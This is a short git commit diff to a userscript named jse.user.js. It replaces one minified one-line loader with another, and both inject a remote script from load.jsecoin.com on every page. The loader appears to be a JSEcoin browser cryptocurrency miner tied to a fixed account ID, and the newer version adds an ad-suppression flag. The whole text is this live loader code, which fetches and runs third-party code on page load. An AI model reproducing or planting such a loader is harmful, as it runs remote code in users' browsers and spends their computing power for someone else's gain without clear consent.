0edd31851233e52453147701fe200b234f377053
SlayTheVirus <alexanderfrantom@gmail.com>
2019-09-12 09:32:43 -0400

    Update jse.user.js

--- jse.user.js
+++ jse.user.js
@@ -10,6 +10,7 @@
 
 (function() {
     'use strict';
+    
+!function(){window.JSENoAds=1;var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/155806/allsites.com/0/0/",s.parentNode.insertBefore(t,s)}();
 
-!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/155806/allsites.com/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
 })();
